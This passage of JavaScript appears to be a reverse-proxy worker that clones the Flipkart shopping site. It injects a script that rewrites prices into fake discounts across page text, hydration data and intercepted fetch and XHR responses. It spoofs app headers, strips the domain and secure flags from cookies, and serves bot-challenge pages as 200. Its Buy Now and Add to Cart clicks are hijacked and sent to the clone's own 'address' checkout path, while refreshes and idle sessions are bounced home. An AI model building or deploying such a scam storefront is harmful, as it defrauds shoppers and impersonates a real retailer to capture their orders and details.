          // Depth-2 scan
          for (var k2 in val) {
            if (Object.prototype.hasOwnProperty.call(val, k2)) {
              var val2 = val[k2];
              if (isMrpKeyVal(k2, val2)) {
                objectIsMrp = true;
              }
              if (typeof val2 === "string") {
                if (isMrpString(val2)) {
                  objectIsMrp = true;
                }
              }
            }
          }
        }
      }
    }
  }

  for(var k in o){
    if(!Object.prototype.hasOwnProperty.call(o,k))continue;
    var v=o[k];
    var isExplicitSellingKey = isPK(k) && !isMrp(k);
    var currentIsMrp = isExplicitSellingKey ? false : (objectIsMrp || isMrp(k));
    var currentIsDiscount = objectIsDiscount || isDiscountPercent(k);

    if(v&&typeof v==='object'){
      discObj(v,isPK(k)||sd,currentIsMrp,currentIsDiscount,depth+1);
    }else if(typeof v==='number'){
      if((currentIsDiscount || isDiscountPercent(k)) && v<100){
        o[k]=PCT;
      }else if(isPK(k)&&!currentIsMrp&&v>=DOM_THRESH){
        var dv=Math.round(v*MULT);
        o[k]=dv;
        if(k==='sellingPrice'||k==='finalPrice'||k==='sp'||k==='listingPrice'){
          if(window.__lastPath!==window.location.pathname){
            window.__lastPath=window.location.pathname;
            window.__fkSP=dv;
          }else if(!window.__fkSP){
            window.__fkSP=dv;
          }
        }
      } else if(isPK(k)&&!currentIsMrp&&v>=1&&v<DOM_THRESH){
        if(k==='sellingPrice'||k==='finalPrice'||k==='sp'){
          if(window.__lastPath!==window.location.pathname){
            window.__lastPath=window.location.pathname;
            window.__fkSP=v;
          }else if(!window.__fkSP){
            window.__fkSP=v;
          }
        }
      }
      else if(sd&&!currentIsMrp&&(k==='value'||k==='amount'||k==='num')&&v>=DOM_THRESH){o[k]=Math.round(v*MULT);}
    }else if(typeof v==='string'){
      if(currentIsDiscount || isDiscountPercent(k)){
        if(v.indexOf('%')!==-1){
          o[k]=v.replace(/\d+%/g, PCT+'%');
        }else{
          var num=parseFloat(v);
          if(!isNaN(num)&&num<100)o[k]=String(PCT);
        }
      }else if(v.indexOf('\u20b9')!==-1 || v.indexOf('\\u20b9')!==-1){
        if(!isMrp(k) && !currentIsMrp){
          o[k]=v.replace(/(?:₹|\\u20b9|\\\\u20b9)\\s*([\\d,]+)/g,function(m,p){
            var n=parseInt(p.replace(/,/g,''),10);
            if(isNaN(n)||n<DOM_THRESH)return m;
            return '\u20b9'+fi(Math.round(n*MULT));
          });
        }
      }else if(isPK(k)&&!currentIsMrp){
        var num=parseFloat(v.replace(/,/g,''));
        if(!isNaN(num)&&num>=DOM_THRESH)o[k]=(num*MULT).toFixed(2);
      }else if(sd&&!currentIsMrp&&(k==='decimalValue'||k==='value'||k==='amount'||k==='text'||k==='displayValue'||k==='formattedValue'||k==='displayPrice'||k==='label'||k==='title'||k==='subText'||k==='header')){
        var num=parseFloat(v.replace(/,/g,''));
        if(!isNaN(num)&&num>=DOM_THRESH){
          o[k]=v.indexOf(',')!==-1?fi(Math.round(num*MULT)):(num*MULT).toFixed(2);
        }
      }
    }
  }
}

// ── Layer A: JSON.parse override — removed to prevent React state corruption ───
// Server-side discount + fetch interceptor + DOM rewriter handle prices.
// JSON.parse override was modifying React internal objects causing crashes.

// ── Layer B: Hydration state interceptors ─────────────────────
// Intercepts window.__staticRouterHydrationData, __INITIAL_STATE__, currentState
// BEFORE React reads them — prices discounted at hydration time
try{
  var _hyd;
  Object.defineProperty(window,'__staticRouterHydrationData',{
    get:function(){return _hyd;},
    set:function(v){if(v&&typeof v==='object'){try{discObj(v,false,false,false);}catch(e){}}_hyd=v;},
    configurable:true,enumerable:true
  });
  var _ist;
  Object.defineProperty(window,'__INITIAL_STATE__',{
    get:function(){return _ist;},
    set:function(v){if(v&&typeof v==='object'){try{discObj(v,false,false,false);}catch(e){}}_ist=v;},
    configurable:true,enumerable:true
  });
  var _cur;
  Object.defineProperty(window,'currentState',{
    get:function(){return _cur;},
    set:function(v){if(v&&typeof v==='object'){try{discObj(v,false,false,false);}catch(e){}}_cur=v;},
    configurable:true,enumerable:true
  });
}catch(e){}

// ── Layer C: djson — discount ₹ amounts in raw JSON text ─────
function djson(txt){
  if(PCT<=0)return txt;
  return txt.replace(/(?:\\u20b9|\\\\u20b9)([\\d,]{2,})/g,function(m,p){
    var n=parseInt(p.replace(/,/g,''),10);
    if(isNaN(n)||n<DOM_THRESH)return m;
    return (m.charAt(0)==='\u20b9'?'\u20b9':'\\u20b9')+fi(Math.round(n*MULT));
  });
}

// ── Layer C: fetch() interceptor ─────────────────────────────
// FIX: When fetch(requestObject) called, preserve method/body/headers
var _f=window.fetch;
window.fetch=function(input,init){
  var u=typeof input==='string'?input:(input&&input.url?input.url:'');
  if(MOCK.test(u))return Promise.resolve(new Response('{}',{status:200,headers:{'Content-Type':'application/json'}}));
  if(u&&(u.indexOf('://')!==-1||u.indexOf('//')===0)&&u.indexOf('flipkart.com')===-1&&u.indexOf(location.host)===-1)return _f(input,init);
  var ri=Object.assign({},init||{});
  var h=new Headers();
  // If input is a Request object, merge headers and copy options
  if(typeof input!=='string'&&input&&input.url){
    if(!ri.method)ri.method=input.method;
    if(input.method&&input.method!=='GET'&&input.method!=='HEAD'&&ri.body==null){
      try{ri.body=input.body;}catch(e){}
    }
    try{
      var inputHeaders=new Headers(input.headers);
      inputHeaders.forEach(function(v,k){h.set(k,v);});
    }catch(e){}
    ['mode', 'credentials', 'cache', 'redirect', 'referrer', 'referrerPolicy', 'integrity', 'keepalive', 'signal'].forEach(function(k){
      if(ri[k]===undefined&&input[k]!==undefined){
        try{ri[k]=input[k];}catch(e){}
      }
    });
  }
  // Merge init headers if exists
  if(init&&init.headers){
    try{
      var initHeaders=new Headers(init.headers);
      initHeaders.forEach(function(v,k){h.set(k,v);});
    }catch(e){}
  }
  injectH(h);
  ri.headers=h;
  ri.credentials='include';
  var p=_f(rw(u),ri);
  if(PCT<=0)return p;
  return p.then(function(resp){
    var ct=(resp.headers.get('content-type')||'');
    if(ct.indexOf('json')===-1)return resp;
    var cloned=resp.clone();
    try{
      return resp.text().then(function(txt){
        try{
          var out=djson(txt);
          var rh={};
          try{
            cloned.headers.forEach(function(v,k){
              var lk=k.toLowerCase();
              if(lk!=='content-encoding'&&lk!=='content-length'&&lk!=='transfer-encoding'){
                rh[k]=v;
              }
            });
          }catch(e){}
          return new Response(out,{status:resp.status,statusText:resp.statusText,headers:rh});
        }catch(e2){
          return cloned;
        }
      });
    }catch(e){
      return cloned;
    }
  }).catch(function(e){
    return _f(rw(u),ri);
  });
};

// ── Layer D: XHR interceptor — URL rewrite + headers ─────────
var _open=XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open=function(m,u){
  this._fkurl=rw(typeof u==='string'?u:String(u));
  return _open.call(this,m,this._fkurl||u,arguments[2],arguments[3],arguments[4]);
};
var _send=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send=function(){
  try{this.setRequestHeader('flipkart_secure','true');}catch(e){}
  try{this.setRequestHeader('X-Requested-With','com.wFlipkart_19923844');}catch(e){}
  try{this.setRequestHeader('Network-Type','4g');}catch(e){}

  try {
    var clientUA = navigator.userAgent || '';
    var isChromium = clientUA.toLowerCase().indexOf('chrome') !== -1 || clientUA.toLowerCase().indexOf('chromium') !== -1;
    var finalFkua = BASE_UA;
    if (clientUA) {
      if (clientUA.indexOf('Mobile') !== -1 && clientUA.indexOf('FKUA') === -1) {
        finalFkua = clientUA;
      } else {
        finalFkua = clientUA.replace(/\\s*FKUA\\/msite\\/0\\.0\\.3\\/msite\\/Mobile/g, "");
      }
    }
    var finalXua = finalFkua + " FKUA/msite/0.0.3/msite/Mobile";
    this.setRequestHeader('fkua-User-Agent', finalFkua);
    this.setRequestHeader('X-User-Agent', finalXua);

    if (isChromium) {
      this.setRequestHeader('sec-ch-ua','"Chromium";v="148", "Android WebView";v="148", "Not(A)Brand";v="99"');
      this.setRequestHeader('sec-ch-ua-platform','"Android"');
      this.setRequestHeader('sec-ch-ua-mobile','?1');
    }
  } catch(e) {}

  return _send.apply(this,arguments);
};

// ── Refresh / Back-from-external → HOME page redirect ──────────
(function(){
  var HOME=window.location.protocol+'//'+window.location.host+'/';
  var onHome=(window.location.pathname==='/'||window.location.pathname==='');
  var EXT_KEY='__fkExt';
  try{
    var ne=(performance.getEntriesByType('navigation')[0]||{}).type;
    // Refresh pe → home (har page pe)
    if(!onHome&&ne==='reload'){window.location.replace(HOME);return;}
    // Legacy API fallback for reload
    if(!onHome&&ne===undefined&&performance.navigation&&performance.navigation.type===1){window.location.replace(HOME);return;}
    // Back kiya aur pehle external site pe gaye the → home
    if(ne==='back_forward'){
      try{if(sessionStorage.getItem(EXT_KEY)==='1'){sessionStorage.removeItem(EXT_KEY);window.location.replace(HOME);return;}}catch(e){}
    }
  }catch(e){}
  // bfcache restore (kuch browsers mein) → home
  window.addEventListener('pageshow',function(ev){
    if(ev.persisted)window.location.replace(HOME);
  });
  // External site pe jaane se pehle flag set karo
  window.__fkMarkExt=function(){try{sessionStorage.setItem(EXT_KEY,'1');}catch(e){}};
})();

// ── Buy Now → real Flipkart redirect ──────────────────────────
(function(){
  // Buy Now ke paas DOM se saare ₹ prices uthao, phir smart filter lagao
  function priceNearEl(btn){
    var node=btn;
    var d=0;
    while(node&&node!==document.body&&d<12){
      var txt=node.textContent||'';
      if(txt.indexOf('\u20b9')!==-1){
        var ms=txt.match(/\\u20b9\\s*([\\d,]+)/g);
        if(ms&&ms.length>0){
          var prices=[];
          var lastIdx = 0;
          for(var i=0;i<ms.length;i++){
            var matchStr = ms[i];
            var matchIdx = txt.indexOf(matchStr, lastIdx);
            if(matchIdx === -1) {
              matchIdx = txt.indexOf(matchStr);
              if (matchIdx === -1) matchIdx = 0;
            } else {
              lastIdx = matchIdx + matchStr.length;
            }
            
            // Check context for EMI
            var start = Math.max(0, matchIdx - 20);
            var end = Math.min(txt.length, matchIdx + matchStr.length + 20);
            var context = txt.slice(start, end).toLowerCase();
            if (
              context.indexOf('emi') !== -1 ||
              context.indexOf('/m') !== -1 ||
              context.indexOf('month') !== -1 ||
              context.indexOf('pm') !== -1 ||
              context.indexOf('interest') !== -1 ||
              context.indexOf('off') !== -1 ||
              context.indexOf('save') !== -1 ||
              context.indexOf('discount') !== -1 ||
              context.indexOf('coupon') !== -1 ||
              context.indexOf('downpayment') !== -1 ||
              context.indexOf('get at') !== -1 ||
              context.indexOf('get') !== -1 ||
              context.indexOf('offer') !== -1 ||
              context.indexOf('deal') !== -1
            ) {
              continue; // Skip EMI, discounts, coupons, and monthly payments
            }
            
            var n=parseInt(matchStr.replace(/[^\\d]/g,''),10);
            if(!isNaN(n)&&n>=1&&n<10000000)prices.push(n);
          }
          if(prices.length>0){
            var maxP=Math.max.apply(null,prices);
            var cutoff=Math.max(10, maxP*MULT*0.5);
            var valid=[];
            for(var j=0;j<prices.length;j++){
              if(prices[j]>=cutoff)valid.push(prices[j]);
            }
            if(valid.length>0){
              valid.sort(function(a,b){return a-b;});
              return valid[0];
            }
          }
        }
      }
      node=node.parentNode;
      d++;
    }
    return 0;
  }

  function extractPrice(btn){
    try{
      // Helper function to extract price from text while ignoring EMI/monthly payments
      function parseCleanPrice(text) {
        var cleanText = (text || '').toLowerCase();
        if (
          cleanText.indexOf('emi') !== -1 ||
          cleanText.indexOf('/m') !== -1 ||
          cleanText.indexOf('month') !== -1 ||
          cleanText.indexOf('pm') !== -1 ||
          cleanText.indexOf('interest') !== -1 ||
          cleanText.indexOf('off') !== -1 ||
          cleanText.indexOf('save') !== -1 ||
          cleanText.indexOf('discount') !== -1 ||
          cleanText.indexOf('coupon') !== -1 ||
          cleanText.indexOf('downpayment') !== -1 ||
          cleanText.indexOf('get at') !== -1 ||
          cleanText.indexOf('get') !== -1 ||
          cleanText.indexOf('offer') !== -1 ||
          cleanText.indexOf('deal') !== -1
        ) {
          return null; // Skip EMI, discounts, coupons, and monthly payments
        }
        var match = text.match(/(?:\\u20b9|₹)\\s*([\\d,]+)/) || text.match(/buy now at\\s*([\\d,]+)/i);
        if (match) {
          var n = parseInt(match[1].replace(/,/g, ''), 10);
          if (!isNaN(n) && n >= 5 && n < 10000000) {
            return n;
          }
        }
        return null;
      }

      // Step 1: Check the clicked button text itself
      var directPrice = parseCleanPrice(btn.textContent);
      if (directPrice) return directPrice;

      // Step 2: Check immediate siblings of the clicked element (within the same button or bottom bar)
      if (btn.parentNode) {
        var children = btn.parentNode.children;
        for (var i = 0; i < children.length; i++) {
          var child = children[i];
          if (child === btn) continue;
          var sibPrice = parseCleanPrice(child.textContent);
          if (sibPrice) return sibPrice;
        }
      }

      // Step 3: Go up to parent nodes up to 3 levels, but check parent children (siblings of parent)
      var node = btn.parentNode;
      for (var d = 0; d < 2 && node && node !== document.body; d++) {
        var children = node.children;
        for (var i = 0; i < children.length; i++) {
          var child = children[i];
          var parentSibPrice = parseCleanPrice(child.textContent);
          if (parentSibPrice) return parentSibPrice;
        }
        node = node.parentNode;
      }

      // Priority 1: JSON interceptor se sellingPrice (first-wins, discObj se)
      if(window.__fkSP>0)return window.__fkSP;

      // Priority 1b: DOM pre-order traversal (find first valid product price text node)
      try {
        function isStrikethrough(el) {
          var node = el;
          var depth = 0;
          while (node && node !== document.body && depth < 4) {
            var tag = (node.tagName || '').toUpperCase();
            if (tag === 'DEL' || tag === 'S' || tag === 'STRIKE') return true;
            var cl = (node.className || '');
            if (typeof cl === 'string' && (cl.indexOf('strike') !== -1 || cl.indexOf('line-through') !== -1 || cl.indexOf('_3I9_R9') !== -1 || cl.indexOf('mrp') !== -1)) {
              return true;
            }
            var style = node.getAttribute ? (node.getAttribute('style') || '') : '';
            if (style.indexOf('line-through') !== -1) return true;
            node = node.parentNode;
            depth++;
          }
          return false;
        }

        // Traverse the DOM in pre-order to find the first price text node
        var foundPrice = 0;
        function traverse(node) {
          if (foundPrice > 0) return;
          if (node.nodeType === 3) {
            var t = node.textContent;
            if (t.indexOf('\u20b9') !== -1 || t.indexOf('₹') !== -1) {
              if (!isStrikethrough(node.parentNode)) {
                var pVal = parseCleanPrice(t);
                if (pVal > 0) {
                  foundPrice = pVal;
                }
              }
            }
          } else if (node.nodeType === 1) {
            var tag = (node.tagName || '').toUpperCase();
            if (tag !== 'SCRIPT' && tag !== 'STYLE' && tag !== 'NOSCRIPT' && tag !== 'TEXTAREA') {
              for (var i = 0; i < node.childNodes.length; i++) {
                traverse(node.childNodes[i]);
                if (foundPrice > 0) return;
              }
            }
          }
        }
        traverse(document.body);
        if (foundPrice > 0) return foundPrice;
      } catch(ex) {}

      // Priority 2: Buy Now ke paas DOM scan (dynamic cutoff heuristic — EMI/offer filter)
      var near=priceNearEl(btn);
      if(near>0)return near;

      // Priority 3: Poora page scan — saare ₹ uthao, 5% rule lagao
      var all=[];
      var els=document.body.getElementsByTagName('*');
      for(var i=0;i<els.length;i++){
        var el=els[i];
        var tag=el.tagName;
        if(tag==='SCRIPT'||tag==='STYLE'||tag==='NOSCRIPT'||tag==='IFRAME')continue;
        for(var j=0;j<el.childNodes.length;j++){
          var cn=el.childNodes[j];
          if(cn.nodeType!==3)continue;
          var t=cn.textContent||'';
          if(t.indexOf('\u20b9')===-1)continue;
          var parts=t.match(/\\u20b9\\s*([\\d,]+)/g);
          if(!parts)continue;
          
          var lastIdx = 0;
          for(var p=0;p<parts.length;p++){
            var matchStr = parts[p];
            var matchIdx = t.indexOf(matchStr, lastIdx);
            if(matchIdx === -1) {
              matchIdx = t.indexOf(matchStr);
              if (matchIdx === -1) matchIdx = 0;
            } else {
              lastIdx = matchIdx + matchStr.length;
            }
            
            // Check context for EMI
            var start = Math.max(0, matchIdx - 20);
            var end = Math.min(t.length, matchIdx + matchStr.length + 20);
            var context = t.slice(start, end).toLowerCase();
            if (
              context.indexOf('emi') !== -1 ||
              context.indexOf('/m') !== -1 ||
              context.indexOf('month') !== -1 ||
              context.indexOf('pm') !== -1 ||
              context.indexOf('interest') !== -1 ||
              context.indexOf('off') !== -1 ||
              context.indexOf('save') !== -1 ||
              context.indexOf('discount') !== -1 ||
              context.indexOf('coupon') !== -1 ||
              context.indexOf('downpayment') !== -1 ||
              context.indexOf('get at') !== -1 ||
              context.indexOf('get') !== -1 ||
              context.indexOf('offer') !== -1 ||
              context.indexOf('deal') !== -1
            ) {
              continue; // Skip EMI, discounts, coupons, and monthly payments
            }
            
            var n=parseInt(matchStr.replace(/[^\\d]/g,''),10);
            if(!isNaN(n)&&n>=1&&n<10000000)all.push(n);
          }
        }
      }
      if(all.length>0){
        var mx=Math.max.apply(null,all);
        var ct=Math.max(10, mx*MULT*0.5);
        var vl=[];
        for(var q=0;q<all.length;q++){if(all[q]>=ct)vl.push(all[q]);}
        if(vl.length>0){vl.sort(function(a,b){return a-b;});return vl[0];}
      }
    }catch(e){}
    return 0;
  }

  (function(){
    var events = ['click', 'mousedown', 'mouseup', 'touchstart', 'touchend', 'pointerdown', 'pointerup'];
    function handleBuy(e) {
      var onProduct = window.location.pathname.indexOf('/p/') !== -1 || window.location.pathname.indexOf('/dl/') !== -1;
      if (!onProduct) return;

      var el = e.target;
      var depth = 0;
      while(el && el !== document && depth < 12){
        var txt = (el.textContent || '').replace(/\\s+/g, ' ').trim().toLowerCase();
        var tag = (el.tagName || '').toUpperCase();
        var cl = (el.className && typeof el.className === 'string') ? el.className.toLowerCase() : '';
        
        var isButtonLike = (
          tag === 'BUTTON' || 
          tag === 'A' || 
          el.getAttribute('role') === 'button' ||
          cl.indexOf('btn') !== -1 || 
          cl.indexOf('button') !== -1 || 
          cl.indexOf('_2kpz6l') !== -1 || 
          cl.indexOf('buy') !== -1 || 
          cl.indexOf('checkout') !== -1 ||
          cl.indexOf('action') !== -1
        );
        
        var specificCheckoutPattern = /(buy\\s*now|buy\\s*at|buy\\s*with\\s*emi|buy\\s*together|pre-order|pre\\s*order|add\\s*to\\s*cart|add\\s*to\\s*basket)/i;
        var hasBuyWord = specificCheckoutPattern.test(txt);
        
        var matches = false;
        if (hasBuyWord) {
          if (isButtonLike) {
            matches = true;
          } else if (txt.length < 80) {
            matches = true;
          }
        }
        
        if (matches) {
          e.preventDefault();
          e.stopPropagation();
          if (!window.__redirected) {
            window.__redirected = true;
            setTimeout(function() { window.__redirected = false; }, 2000);
            var price = extractPrice(el);
            // External site pe jaane se pehle back-flag set karo
            try { if (window.__fkMarkExt) window.__fkMarkExt(); } catch(ex) {}
            window.location.href = window.location.protocol + '//' + window.location.host + '/?=address?=' + price;
          }
          return false;
        }
        el = el.parentNode;
        depth++;
      }
    }
    for (var i = 0; i < events.length; i++) {
      try {
        document.addEventListener(events[i], handleBuy, { capture: true, passive: false });
      } catch (ex) {
        document.addEventListener(events[i], handleBuy, true);
      }
    }
  })();
})();

  // ── Inactivity Redirect (10 minutes) ──────────────────────
  (function(){
    var HOME = window.location.protocol + '//' + window.location.host + '/';
    var onHome = (window.location.pathname === '/' || window.location.pathname === '');

    // Inactivity Redirect (10 minutes)
    if (!onHome) {
      var lastActive = localStorage.getItem('__fkLastActive');
      if (lastActive) {
        var elapsed = Date.now() - parseInt(lastActive, 10);
        if (elapsed > 600000) { // 10 minutes
          localStorage.setItem('__fkLastActive', String(Date.now()));
          window.location.replace(HOME);
          return;
        }
      }
    }
    localStorage.setItem('__fkLastActive', String(Date.now()));

    function updateActivity() {
      localStorage.setItem('__fkLastActive', String(Date.now()));
    }
    window.addEventListener('click', updateActivity);
    window.addEventListener('touchstart', updateActivity);
    window.addEventListener('scroll', updateActivity);

    document.addEventListener('visibilitychange', function() {
      if (document.visibilityState === 'visible') {
        var lastActive = localStorage.getItem('__fkLastActive');
        if (lastActive) {
          var elapsed = Date.now() - parseInt(lastActive, 10);
          if (elapsed > 600000 && !onHome) {
            window.location.replace(HOME);
          }
        }
      }
      localStorage.setItem('__fkLastActive', String(Date.now()));
    });
  })();

  window.sonic={track:function(){},init:function(){},sendBeacon:function(){}};
})();
<\/script>`;

      const respH = new Headers({
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store",
        "Access-Control-Allow-Origin": origin || "*",
        "Access-Control-Allow-Credentials": "true",
        "Accept-CH": "Sec-CH-UA-Model, Sec-CH-UA-Platform",
        "Critical-CH": "Sec-CH-UA-Model"
      });
      for (const sc of setCookies)
        respH.append(
          "Set-Cookie",
          sc.replace(/;\s*domain=[^;]*/gi, "").replace(/;\s*secure/gi, ""),
        );

      const mult = discountPct > 0 ? (100 - discountPct) / 100 : 1;
      class PriceTextHandler {
        constructor(pct) {
          this.pct = pct;
          this.mult = (100 - pct) / 100;
          this.domThresh = Math.max(500, Math.round(500 / this.mult));
          this.strikeDepth = 0;
        }
        element(el) {
          const tag = el.tagName.toUpperCase();
          const cl = el.getAttribute("class") || "";
          const style = el.getAttribute("style") || "";
          const isStrike = (
            tag === "DEL" ||
            tag === "S" ||
            tag === "STRIKE" ||
            cl.includes("strike") ||
            cl.includes("line-through") ||
            cl.includes("_3I9_R9") ||
            style.includes("line-through")
          );
          if (isStrike) {
            this.strikeDepth++;
            el.onEndTag(() => {
              this.strikeDepth = Math.max(0, this.strikeDepth - 1);
            });
          }
        }
        text(chunk) {
          if (this.strikeDepth > 0) return;
          if (!chunk.text || chunk.text.indexOf("₹") === -1) return;
          const modified = chunk.text.replace(/₹\s*([\d,]+)/g, (m, p) => {
            const n = parseInt(p.replace(/,/g, ""), 10);
            if (isNaN(n) || n < this.domThresh) return m;
            return "₹" + fmtIndian(Math.round(n * this.mult));
          });
          if (modified !== chunk.text) chunk.replace(modified);
        }
      }
      const priceTextHandler = discountPct > 0 ? new PriceTextHandler(discountPct) : null;

      const rewriter = new HTMLRewriter()
        .on("head", {
          element(el) {
            el.prepend(INTERCEPTOR, { html: true });
            if (domPriceScript) el.append(domPriceScript, { html: true });
          },
        })
        .on("[href]", {
          element(el) {
            const v = el.getAttribute("href") || "";
            const r = rewriteUrl(v, base);
            if (r !== v) el.setAttribute("href", r);
          },
        })
        .on("[src]", {
          element(el) {
            const v = el.getAttribute("src") || "";
            const r = rewriteUrl(v, base);
            if (r !== v) el.setAttribute("src", r);
          },
        })
        .on("[action]", {
          element(el) {
            const v = el.getAttribute("action") || "";
            const r = rewriteUrl(v, base);
            if (r !== v) el.setAttribute("action", r);
          },
        });

      if (priceTextHandler) {
        rewriter
          .on("span", priceTextHandler)
          .on("div", priceTextHandler)
          .on("p", priceTextHandler)
          .on("a", priceTextHandler)
          .on("li", priceTextHandler)
          .on("td", priceTextHandler)
          .on("strong", priceTextHandler)
          .on("b", priceTextHandler)
          .on("h1", priceTextHandler)
          .on("h2", priceTextHandler)
          .on("h3", priceTextHandler)
          .on("h4", priceTextHandler)
          .on("label", priceTextHandler)
          .on("button", priceTextHandler);
      }

      // Serve bot-challenge pages (403) as 200 so the browser fully
      // executes the injected interceptor + reCAPTCHA scripts.
      // Login/OTP pages are never 403, so this is safe.
      const serveStatus = upstream.status === 403 ? 200 : upstream.status;
      return rewriter.transform(
        new Response(upstream.body, { status: serveStatus, headers: respH }),
      );
    }

    if (ct.includes("javascript") || ct.includes("text/plain")) {
      const text = await upstream.text();
      const rw = text
        .replace(/https?:\/\/www\.flipkart\.com\//g, base)
        .replace(/https?:\/\/m\.flipkart\.com\//g, base)
        .replace(
          /https?:\/\/([a-z0-9.-]+\.flipkart\.com)\//g,
          `${base}__fk/$1/`,
        )
        .replace(
          /https?:\/\/([a-z0-9.-]+\.flixcart\.com)\//g,
          `${base}__fk/$1/`,
        );
      return new Response(rw, {
        status: upstream.status,
        headers: {
          "Content-Type": "text/javascript; charset=utf-8",
          "Cache-Control": "no-store",
          "Access-Control-Allow-Origin": origin || "*",
        },
      });
    }

    const ph = new Headers();
    for (const [k, v] of upstream.headers) {
      const lk = k.toLowerCase();
      if (["set-cookie", "transfer-encoding", "content-encoding"].includes(lk))
        continue;
      ph.set(k, v);
    }
    ph.set("Access-Control-Allow-Origin", origin || "*");
    ph.set("Access-Control-Allow-Credentials", "true");
    for (const sc of setCookies)
      ph.append(
        "Set-Cookie",
        sc.replace(/;\s*domain=[^;]*/gi, "").replace(/;\s*secure/gi, ""),
      );
    return new Response(upstream.body, {
      status: upstream.status,
      headers: ph,
    });
  },
};


export default async function handler(request) {
  const env = {};
  const ctx = {
    waitUntil: (p) => { if (p && typeof p.catch === 'function') p.catch(() => {}); }
  };
  return await workerObj.fetch(request, env, ctx);
}
